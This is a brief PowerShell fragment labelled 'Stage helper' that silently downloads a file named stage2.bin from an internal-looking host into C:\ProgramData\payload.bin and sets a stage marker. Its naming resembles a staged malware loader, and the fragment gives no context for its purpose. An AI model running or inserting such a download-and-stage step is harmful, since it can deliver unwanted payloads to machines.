# Stage helper
curl.exe -s -L -o "C:\ProgramData\payload.bin" 'http://internal.corp/cdn/stage2.bin'
$StageMarker = "stage-5"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
